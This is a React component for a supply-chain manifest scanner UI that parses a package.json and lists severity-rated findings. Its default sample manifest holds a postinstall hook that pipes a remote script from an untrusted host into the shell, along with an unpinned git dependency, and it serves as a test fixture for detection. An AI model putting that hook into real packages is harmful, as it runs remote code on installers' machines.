import React, { useState } from 'react';
import {
  Boxes,
  ShieldCheck,
  AlertTriangle,
  FileCode,
  CheckCircle2,
  AlertOctagon,
  Download,
  Info
} from 'lucide-react';
import { api } from '../services/api.js';

export const SupplyChainScanner: React.FC = () => {
  const [manifestText, setManifestText] = useState<string>(`{
  "name": "enterprise-mcp-adapter",
  "version": "1.0.4",
  "dependencies": {
    "express": "^4.21.2",
    "synthetic-test-fixture-pkg": "0.0.1",
    "unpinned-remote-helper": "git+https://github.com/external-unpinned/repo.git#master"
  },
  "devDependencies": {
    "typescript": "^5.4.0"
  },
  "scripts": {
    "postinstall": "curl -sSf https://untrusted-external.sh | sh",
    "build": "tsc"
  }
}`);

  const [isScanning, setIsScanning] = useState(false);
  const [scanReport, setScanReport] = useState<any | null>(null);

  const handleScan = async () => {
    setIsScanning(true);
    setScanReport(null);
    try {
      const data = await api.scanManifest(manifestText);
      setScanReport(data);
    } catch (e: any) {
      alert(`Manifest scan error: ${e.message}`);
    } finally {
      setIsScanning(false);
    }
  };

  return (
    <div className="space-y-6">
      {/* Header */}
      <div>
        <h1 className="text-xl font-bold text-slate-100 flex items-center gap-2">
          <Boxes className="w-5 h-5 text-purple-400" />
          <span>Supply-Chain Manifest &amp; Dependency Scanner</span>
        </h1>
        <p className="text-xs text-slate-400 mt-1">
          Static AST analyzer for package manifests, dependency trees, unpinned repository tags, and dangerous install lifecycle hooks.
        </p>
      </div>

      {/* Principle Notice per Section 20 */}
      <div className="p-3.5 rounded-lg bg-[#0F172A] border border-blue-900/40 text-xs text-slate-300 flex items-start gap-2.5">
        <Info className="w-4 h-4 text-cyan-400 shrink-0 mt-0.5" />
        <div className="space-y-1">
          <span className="font-semibold text-slate-100">Methodology &amp; Standards Compliance (Section 20):</span>
          <p className="text-slate-400 leading-relaxed">
            This scanner performs <span className="text-cyan-300 font-bold">local static AST analysis</span> of declared package structures, unpinned references, and script hooks. No synthetic CVEs are fabricated or claimed without an authoritative CVE feed. Test fixture findings are strictly identified as fixture detections.
          </p>
        </div>
      </div>

      {/* Editor & Scanner Controls */}
      <div className="p-5 rounded-xl bg-[#0F172A] border border-slate-800 space-y-4">
        <div className="flex items-center justify-between border-b border-slate-800 pb-3">
          <h2 className="text-sm font-bold text-slate-100 flex items-center gap-2">
            <FileCode className="w-4 h-4 text-cyan-400" />
            <span>Target Manifest (package.json)</span>
          </h2>
          <span className="text-[10px] font-mono px-2 py-0.5 rounded bg-purple-950 text-purple-400 border border-purple-800">
            LOCAL AST PARSER
          </span>
        </div>

        <div className="space-y-3 text-xs">
          <textarea
            rows={10}
            value={manifestText}
            onChange={(e) => setManifestText(e.target.value)}
            className="w-full bg-black/60 border border-slate-700 rounded-lg p-3 text-cyan-300 font-mono text-xs focus:outline-none focus:border-blue-500 scrollbar-thin scrollbar-thumb-slate-800"
          />

          <div className="flex justify-end">
            <button
              onClick={handleScan}
              disabled={isScanning}
              className="px-4 py-2 text-xs font-semibold rounded-lg bg-purple-600 hover:bg-purple-500 text-white flex items-center gap-1.5 cursor-pointer shadow-md shadow-purple-900/30 disabled:opacity-50"
            >
              <Boxes className="w-3.5 h-3.5" />
              <span>{isScanning ? 'Parsing Manifest...' : 'Run Supply-Chain Scan'}</span>
            </button>
          </div>
        </div>
      </div>

      {/* Scan Report Findings */}
      {scanReport && (
        <div className="p-5 rounded-xl bg-[#0F172A] border border-slate-800 space-y-4 animate-in fade-in duration-300">
          <div className="flex items-center justify-between border-b border-slate-800 pb-3">
            <div>
              <h2 className="text-sm font-bold text-slate-100">Scan Assessment Findings</h2>
              <span className="text-xs text-slate-400 font-mono">
                Scanned {scanReport.totalDependenciesScanned} dependencies · {scanReport.findings.length} findings
              </span>
            </div>

            <span className={`text-[10px] font-mono font-bold px-2.5 py-1 rounded ${
              scanReport.findings.length > 0 ? 'bg-amber-950 text-amber-400 border border-amber-800' : 'bg-emerald-950 text-emerald-400 border border-emerald-800'
            }`}>
              {scanReport.findings.length > 0 ? 'FINDINGS IDENTIFIED' : 'PASSED STATIC SCAN'}
            </span>
          </div>

          <div className="space-y-3">
            {scanReport.findings.map((finding: any, idx: number) => (
              <div
                key={idx}
                className="p-3.5 rounded-lg bg-black/40 border border-slate-800 text-xs font-mono space-y-1.5"
              >
                <div className="flex items-center justify-between">
                  <div className="flex items-center gap-2">
                    <span className="font-bold text-slate-100">{finding.packageName}</span>
                    <span className="text-slate-400 text-[11px]">({finding.version})</span>
                  </div>
                  <span
                    className={`text-[10px] px-2 py-0.5 rounded font-bold ${
                      finding.severity === 'Critical'
                        ? 'bg-red-950 text-red-400 border border-red-800'
                        : finding.severity === 'High'
                        ? 'bg-orange-950 text-orange-400 border border-orange-800'
                        : 'bg-amber-950 text-amber-400 border border-amber-800'
                    }`}
                  >
                    {finding.severity}
                  </span>
                </div>

                <div className="text-slate-300 font-bold">{finding.title}</div>
                <p className="text-slate-400 text-[11px] leading-relaxed">{finding.description}</p>

                <div className="pt-1 text-[11px] text-cyan-300">
                  <span className="text-slate-500">Remediation:</span> {finding.remediation}
                </div>
                <div className="text-[10px] text-slate-500">
                  Source: {finding.source}
                </div>
              </div>
            ))}
          </div>

          <div className="p-3 rounded-lg bg-slate-900 border border-slate-800 text-[11px] text-slate-400">
            {scanReport.scannerNotice}
          </div>
        </div>
      )}
    </div>
  );
};
